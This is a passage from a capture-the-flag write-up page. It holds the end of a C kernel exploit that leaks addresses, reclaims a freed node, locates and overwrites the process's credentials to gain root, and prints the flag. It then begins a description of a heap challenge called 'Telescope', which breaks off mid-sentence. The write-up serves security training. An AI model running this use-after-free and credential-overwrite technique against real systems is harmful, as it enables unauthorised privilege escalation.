</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Reclaiming victim node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_free</span><span class=p>(</span><span class=n>victim_ctx</span><span class=p>);</span> <span class=c1>// unblock fault
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// ephemeral alloc to put two 0xff at the end for traversal top bytes
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x80</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=n>buf</span><span class=p>[</span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xff</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>buf</span><span class=p>[</span><span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xff</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>setxattr</span><span class=p>(</span><span class=s>&#34;.&#34;</span><span class=p>,</span> <span class=s>&#34;nonexistent&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>XATTR_REPLACE</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_alloc</span><span class=p>(</span><span class=n>victim_ctx</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1337</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Searching for victim node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>victim_fd</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>STAGE2_SPRAY_NUM</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>spray_fd</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>struct</span> <span class=n>spark_info</span> <span class=n>info</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=p>.</span><span class=n>num_children</span> <span class=o>=</span> <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>			<span class=p>};</span>
</span></span><span class=line><span class=cl>			<span class=nf>get_info</span><span class=p>(</span><span class=n>spray_fd</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>info</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=n>info</span><span class=p>.</span><span class=n>num_children</span> <span class=o>==</span> <span class=mi>1337</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>victim_fd</span> <span class=o>=</span> <span class=n>spray_fd</span><span class=p>[</span><span class=n>i</span><span class=p>];</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>victim_fd</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S2] Victim fd = %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=n>victim_fdp</span> <span class=o>=</span> <span class=n>victim_fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cp>#undef STAGE2_SPRAY_NUM
</span></span></span><span class=line><span class=cl><span class=cp>#undef STAGE2_NUM_NODES
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define STAGE3_READ_NUM_CHILDREN 0x4142133703030303
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=nf>stage3_read</span><span class=p>(</span><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>,</span> <span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_free</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=c1>// during read, we keep a special num_children so we can find ourselves
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>reclaim_alloc</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>STAGE3_READ_NUM_CHILDREN</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>struct</span> <span class=n>spark_info</span> <span class=n>info</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>get_info</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>info</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>info</span><span class=p>.</span><span class=n>traversal_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>stage3</span><span class=p>(</span><span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=o>*</span><span class=n>ctx</span><span class=p>,</span> <span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>int</span> <span class=o>*</span><span class=n>scratch_fds</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>s1_dist_addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                   <span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>s1_node_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mh>0x80</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Finding victim node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>victim_addr</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>6000</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>10000</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>addr</span> <span class=o>=</span> <span class=n>s1_node_addr</span> <span class=o>+</span> <span class=n>i</span><span class=o>*</span><span class=mh>0x80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>value</span> <span class=o>=</span> <span class=nf>stage3_read</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=n>addr</span> <span class=o>+</span> <span class=mh>0x58</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>value</span> <span class=o>==</span> <span class=n>STAGE3_READ_NUM_CHILDREN</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>victim_addr</span> <span class=o>=</span> <span class=n>addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>victim_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Victim @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>victim_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Findings creds</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>current</span> <span class=o>=</span> <span class=nf>stage3_read</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=n>victim_addr</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>);</span> <span class=c1>// state_lock.owner
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] current = 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>current</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>cred_addr</span> <span class=o>=</span> <span class=nf>stage3_read</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=n>current</span> <span class=o>+</span> <span class=mh>0xa90</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] cred @ 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>cred_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Crafting linkable node</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x0</span><span class=p>)</span> <span class=o>=</span> <span class=mi>100000</span><span class=p>;</span> <span class=c1>// id
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// refcount
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x30</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// is_finalized
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>)</span> <span class=o>=</span> <span class=n>victim_addr</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>;</span> <span class=c1>// edges.next (empty list)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x68</span><span class=p>)</span> <span class=o>=</span> <span class=n>victim_addr</span> <span class=o>+</span> <span class=mh>0x68</span><span class=p>;</span> <span class=c1>// edges.prev (empty list)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>reclaim_free</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_alloc_raw</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Building graph</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>graph_fds</span><span class=p>[</span><span class=n>S1_DIST_NUM_NODES</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>S1_DIST_NUM_NODES</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>graph_fds</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>scratch_fds</span><span class=p>[</span><span class=n>i</span><span class=p>];</span> <span class=c1>// avoid allocations, they mess stuff up
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>S1_DIST_NUM_NODES</span><span class=o>-</span><span class=mi>1</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nf>llink</span><span class=p>(</span><span class=n>graph_fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>graph_fds</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>llink</span><span class=p>(</span><span class=n>graph_fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>  <span class=c1>// weight = write primitive value (zero for root creds)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>finalize</span><span class=p>(</span><span class=n>graph_fds</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Freeing stage1 dist array</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// refcount
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x30</span><span class=p>)</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=c1>// is_finalized
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// fake node_array overlaps unused nb_lock
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x38</span> <span class=o>+</span> <span class=mh>0x0</span><span class=p>)</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=c1>// fake node_array.size
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x38</span> <span class=o>+</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>=</span> <span class=n>s1_dist_addr</span><span class=p>;</span> <span class=c1>// fake node_array.nodes (will be freed)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>)</span> <span class=o>=</span> <span class=n>victim_addr</span> <span class=o>+</span> <span class=mh>0x60</span><span class=p>;</span> <span class=c1>// edges.next (empty list)
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=o>*</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>buf</span> <span class=o>+</span> <span class=mh>0x78</span><span class=p>)</span> <span class=o>=</span> <span class=n>victim_addr</span> <span class=o>+</span> <span class=mh>0x38</span><span class=p>;</span> <span class=c1>// traversal = fake node_array
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>reclaim_free</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_alloc_raw</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>release</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span> <span class=c1>// free s1_dist_addr
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>fd</span> <span class=o>=</span> <span class=nf>create</span><span class=p>();</span> <span class=c1>// immediately reclaim victim node to restore stable state
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;[S3] Overwriting cred</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>write_addr</span> <span class=o>=</span> <span class=n>cred_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=o>*</span><span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>idx</span> <span class=o>=</span> <span class=p>(</span><span class=n>write_addr</span> <span class=o>-</span> <span class=n>s1_dist_addr</span><span class=p>)</span> <span class=o>/</span> <span class=mi>8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_free</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>reclaim_alloc</span><span class=p>(</span><span class=n>ctx</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>idx</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>query</span><span class=p>(</span><span class=n>graph_fds</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>graph_fds</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>print_flag</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=s>&#34;/flag&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=n>fd</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>assert</span><span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=nf>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;!!! FLAG: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>scratch_fds</span><span class=p>[</span><span class=mi>12</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>12</span><span class=p>;</span>  <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>scratch_fds</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=nf>create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Leak a distance array (still malloc&#39;ed) and the address of a live node
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>s1_dist_addr</span><span class=p>,</span> <span class=n>s1_node_addr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>s1_node_fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>stage1</span><span class=p>(</span><span class=o>&amp;</span><span class=n>s1_dist_addr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s1_node_addr</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>s1_node_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Get a fd that can be freed and reclaimed repeatedly
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>struct</span> <span class=n>reclaim_ctx</span> <span class=n>victim_ctx</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>victim_fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>stage2</span><span class=p>(</span><span class=o>&amp;</span><span class=n>victim_ctx</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>victim_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Get somewhat rootish privileges
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nf>stage3</span><span class=p>(</span><span class=o>&amp;</span><span class=n>victim_ctx</span><span class=p>,</span> <span class=n>victim_fd</span><span class=p>,</span> <span class=n>scratch_fds</span><span class=p>,</span> <span class=n>s1_dist_addr</span><span class=p>,</span> <span class=n>s1_node_addr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nf>print_flag</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><iframe width=560 height=315 src="https://www.youtube.com/embed/3-4cnyswp4w?si=R3UdpzuKZcIuo1Bf" title="YouTube video player" frameborder=0 allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy=strict-origin-when-cross-origin allowfullscreen></iframe><h2 class="relative group">Telescope<div id=telescope class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#telescope aria-label=Anchor>#</a></span></h2><blockquote><p>Look up in the sky â‡‘</p><p>nc 13.112.193.37 8573</p><p>Note:
The service is running on Ubuntu 20.04</p></blockquote><h3 class="relative group">Challenge Releas Content<div id=challenge-releas-content class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#challenge-releas-content aria-label=Anchor>#</a></span></h3><table><thead><tr><th style=text-align:right>file</th><th>comment</th></tr></thead><tbody><tr><td style=text-align:right>telescope.proto</td><td>This is the description of the protocol of protobuf</td></tr><tr><td style=text-align:right>telescope</td><td>the binary to exploit</td></tr><tr><td style=text-align:right>libprotobuf.so.17</td><td>protobuf remote library</td></tr><tr><td style=text-align:right>libc.so.6</td><td>libc remote library</td></tr></tbody></table><h3 class="relative group">The Binary<div id=the-binary class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#the-binary aria-label=Anchor>#</a></span></h3><p>The binary is simple to understand is the classic few option CTF binary.
It is possible to create read and modify heap chunks with an extra interesting option that is to interpret the bytes ad protobuf protocol.
Chunks are saved on an array of 1024 elements in <code>.bss</code> called <code>slots</code>, and the corresponding size is saved on another array in <code>.bss</code> called <code>slot_sizes</code>.
In particulare, there are 6 options:</p><h4 class="relative group">[1] Create chunk<div id=1-create-chunk class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#1-create-chunk aria-label=Anchor>#</a></span></h4><p>It asks you for the number of slots and the size. It makes a malloc of the given
size, memset the chunk to zero, and store a pointer to the new chunk into
<code>slots[&lt;index>]</code> where <code>&lt;index></code> is also a parameter chosen by the user. It also
set <code>slots_sizes[&lt;index>]</code> to the corrisponding size.</p><h4 class="relative group">[2] Read data into a chunk<div id=2-read-data-into-a-chunk class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#2-read-data-into-a-chunk aria-label=Anchor>#</a></span></h4><p>It asks for a slots index and then lets you write inside the chunk. The amount
of bytes that you can write is the number of the size saved into <code>slots_sizes</code>.
Bytes are read singularly. There is no possibility of short-read (read fewer
